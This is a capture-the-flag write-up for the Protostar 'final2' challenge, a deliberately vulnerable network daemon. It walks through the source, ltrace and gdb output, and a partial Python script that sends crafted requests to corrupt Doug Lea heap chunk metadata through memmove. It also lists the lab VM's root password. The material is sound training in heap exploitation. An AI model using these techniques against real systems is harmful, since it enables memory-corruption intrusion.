## Protostar final2 writeup

[Challenge's page](https://exploit-exercises.lains.space/protostar/final2/)

This is your standard Doug lea heap implementaion exploit, that could be a bit of a headacha, especially if you're
not very familiar with Doug lea's alogrithem, which i will try to explain along the way.

##### First lets take a look at the code
```C
#include "../common/common.c"
#include "../common/malloc.c"

#define NAME "final2"
#define UID 0
#define GID 0
#define PORT 2993

#define REQSZ 128

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p){
     start = strstr(buf, "ROOT");
     if(start) {
         while(*start != '/') start--;
         memmove(start, p, l);
     }
  }
}

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      destroylist[dll] = buf;
      
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);     

      dll++;
  }

  for(i = 0; i < dll; i++) {
      write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  get_requests(fd);

}
```
*i edited the code a bit*

*- added the 'destroylist[dll] = buf;' at line 55 since is was missing in the challenge's page*

*- and removed the extra printf*

In the main function we see the following code
```C
 /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  get_requests(fd);
 ```
functions 'background_process', 'serve_forever' and 'set_io',
which are not library functions and we dont have their source code,
but we can tell what they do if we switch to the root user with "su root"

*root password is 'godmode'*

and kill the process with 'pkill final2'
and restrat the programm with ltrace attached to it with 'ltrace -f /opt/protostar/bin/final2'
first we see these library calls
```
[pid 2458] __libc_start_main(0x804be26, 1, 0xbffffd84, 0x804bea0, 0x804be90 <unfinished ...>
[pid 2458] signal(17, 0x080490e4)                                                          = NULL
[pid 2458] signal(13, 0x00000001)                                                          = NULL
[pid 2458] signal(13, 0x00000001)                                                          = 0x00000001
[pid 2458] snprintf("/opt/protostar/run/final2.pid", 511, "/opt/protostar/run/%s.pid", "final2") = 29
[pid 2458] open("/opt/protostar/run/final2.pid", 578, 0700)                                = 3
[pid 2458] setgroups(1, 0xbffffa98, 448, 0x804c2e2, 0xb7e9c7c4)                            = 0
[pid 2458] setresgid(0, 0, 0, 0x804c2e2, 0xb7e9c7c4)                                       = 0
[pid 2458] setresuid(0, 0, 0, 0x804c2e2, 0xb7e9c7c4)                                       = 0
[pid 2458] daemon(0, 0, 0, 0x804c2e2, 0xb7e9c7c4 <unfinished ...>
[pid 2458] +++ exited (status 0) +++
```
which sets the userid and the groupid to 0
and calls the 'daemon' functions, which creates a new procces and runs it in the background, then


```
[pid 2459] <... daemon resumed> )                                                          = 0
[pid 2459] getpid()                                                                        = 2459
[pid 2459] snprintf("2459\n", 511, "%d\n", 2459)                                           = 5
[pid 2459] strlen("2459\n")                                                                = 5
[pid 2459] write(3, "2459\n", 5)                                                           = 5
[pid 2459] strlen("2459\n")                                                                = 5
[pid 2459] close(3)                                                                        = 0
[pid 2459] memset(0xbffffc4c, '\000', 16)                                                  = 0xbffffc4c
[pid 2459] htonl(0, 0, 16, 0, 0)                                                           = 0
[pid 2459] htons(2993, 0, 16, 0, 0)                                                        = 45323
[pid 2459] socket(2, 1, 0)                                                                 = 3
[pid 2459] setsockopt(3, 1, 2, 0xbffffc48, 4)                                              = 0
[pid 2459] bind(3, 0xbffffc4c, 16, 0xbffffc48, 4)                                          = 0
[pid 2459] listen(3, 10, 16, 0xbffffc48, 4)                                                = 0
[pid 2459] accept(3, 0xbffffc88, 0xbffffc84, 0, 0
```
in the newly created process, an AF_INET socket is created and is setup for listening on port 2993,
now the program waiting for an incomming connection

if we open an another terminal and try to connect to it using netcat with 'nc 127.1 2993'

```
[pid 2459] fork() = 2485
[pid 2459] close(4) = 0
[pid 2459] accept(3, 0xbffffc88, 0xbffffc84, 0, 0 <unfinished ...>
[pid 2485] <... fork resumed> ) = 0
[pid 2485] close(3) = 0
[pid 2485] dup2(4, 0) = 0
[pid 2485] dup2(4, 1) = 1
[pid 2485] dup2(4, 2) = 2
...
[pid 2485] read(4,
```

a new process is created with fork which have its stdout, stderr and stdin set to the socket connecetd to our necat session, then 'read' is called on our socket
which must be in 'get_requests'.
so, let's have a look at 'get_requests' function's code

```C
while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      destroylist[dll] = buf;
      
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);     

      dll++;
  }

  for(i = 0; i < dll; i++) {
      write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
```
it enters an infinite loop which breaks if input is less that constant REQSZ or if the first 4 bytes are not "FSRD"
then, 'check_path' function is called

```C
  p = rindex(buf, '/');
  l = strlen(p);
  if(p){
     start = strstr(buf, "ROOT");
     if(start) {
         while(*start != '/') start--;
         memmove(start, p, l);
     }
  }
```
'p' is set to point to the last '/' in buf

'l' is the lenght of the string after 'p'

and 'start' is set to the first '/' before the string "ROOT"

then data of the string 'p' is moved to where 'start' is.

We obviously need to find a way to controll 'memmove' to rewrite heap chunk meta data.

but first, we need a string that passes all the if's to our 'memmove', so our string that:
1. is exactly 128 bytes long
2. the first 4 bytes must be "FSRD"
3. contains a '/'
4. contains the string "ROOT"

now attach gdb to the final2 process

>root@protostar:~# ps -ef | grep final2
```
root      3086     1  0 19:07 ?        00:00:00 /opt/protostar/bin/final2
root      3095  3051  0 19:08 pts/7    00:00:00 grep final2
```
>root@protostar:~# gdb -p 3086

in gdb, set the follow-fork-mode to child

>(gdb) set follow-fork-mode child

and the disassembly-flavor to intel

>(gdb) set disassembly-flavor intel

now set a break point at 'memmove'
```
0x0804bd40 <check_path+112>:    call   0x8048f8c <memmove@plt>
0x0804bd45 <check_path+117>:    leave
0x0804bd46 <check_path+118>:    ret
```
>(gdb) break \*0x0804bd40

and continue
>(gdb) continue

now the proccess is waiting for input

let's write a quick python script and using sockets to interact the proc

```python
import socket

s = socket.socket(socket.AF_INET)
s.connect(('127.1', 2993))
```
this creates a socket that we can use to send and recive data.

construct a basic string that will our if's, send it, execute our script and check gdb

```python
m = "FSRD/0000ROOT/1111"
# pad m to 128 bytes
m += "A" * (128 - (len(m)))
s.send(m)
```

we hit the break point
```
Breakpoint 1, 0x0804bd40 in check_path (
    buf=0x804e00c "/0000ROOT/1111", 'A' <repeats 110 times>)
    at final2/final2.c:27
27      final2/final2.c: No such file or directory.
        in final2/final2.c
```

and if we examin the stack
```
(gdb) x/3wx $esp
0xbffff850:     0x0804e00c      0x0804e015      0x00000073
(gdb) x/s 0x0804e00c
0x804e00c:       "/0000ROOT/1111", 'A' <repeats 110 times>
(gdb) x/s 0x0804e015
0x804e015:       "/1111", 'A' <repeats 110 times>
(gdb)
```
and this is our heap 
*you can get heap addr with 'info proc mappings'*
```
(gdb) x/64wx 0x804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x3030302f
0x804e010:      0x4f4f5230      0x31312f54      0x41413131      0x41414141
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x41414141      0x41414141      0x00000000      0x00000f79
0x804e090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
```
so if we can controll where 'start' points we can write any where in memory
let's talk an another look at 'check_path' code

```C
  p = rindex(buf, '/');
  l = strlen(p);
  if(p){
     start = strstr(buf, "ROOT");
     if(start) {
         while(*start != '/') start--;
         memmove(start, p, l);
     }
  }
```
the
>while(\*start != '/') start--;
keeps going backwards from string "ROOT" until it finds a '/'
but, if we remove the '/' before our "ROOT" the loop will probably seg fault because it will run into the unmapped memory
addresses before the heap.

we could solve this by allocating an another chunk after out first one, with a string that has no '/' before its "ROOT", its loop will keep going backwards to our first chunk
which we can control, by changing out padding to '/'s.


```python
import socket

s = socket.socket(socket.AF_INET)
s.connect(('127.1', 2993))

# first chunk
ck1 = "FSRD/0000ROOT/1111"
ck1 += "/" * (128 - (len(ck1)))
s.send(ck1)

# second chunk
ck2 = "FSRDROOT/"
ck2 += "A" * (128 - (len(ck2)))
s.send(ck2)
```
*i renamed the variable m to ck1 and ck2 to make easier to read*

we hit our first break point

if we examing the heap
```
(gdb) x/64wx 0x804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x3030302f
0x804e010:      0x4f4f5230      0x31312f54      0x2f2f3131      0x2f2f2f2f
0x804e020:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e030:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e040:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e080:      0x2f2f2f2f      0x2f2f2f2f      0x00000000      0x00000f79
0x804e090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
```
*you could set a variable in gdb for the heap address with a 
> set $heap = 0x804e000
and examin the heap with a 
> x/64wx $heap*

you can see our '/'(0x2f) filling the heap

continue.

```
(gdb) x/64wx 0x804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x3030302f
0x804e010:      0x4f4f5230      0x31312f54      0x2f2f3131      0x2f2f2f2f
0x804e020:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e030:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e040:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e080:      0x2f2f2f2f      0x2f2f2f2f      0x00000000      0x00000089
0x804e090:      0x44525346      0x544f4f52      0x4141412f      0x41414141
0x804e0a0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0c0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0d0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0e0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0f0:      0x41414141      0x41414141      0x41414141      0x41414141
```
check heap and memmove arguments

![image1](https://github.com/YazoSh/ctf-writeups/raw/master/images/final2-1.png)

so when memmove executes, the content in p will be copied to start overriding 
chunk2 heap meta data.

![image2](https://raw.githubusercontent.com/YazoSh/ctf-writeups/master/images/final2-2.png)

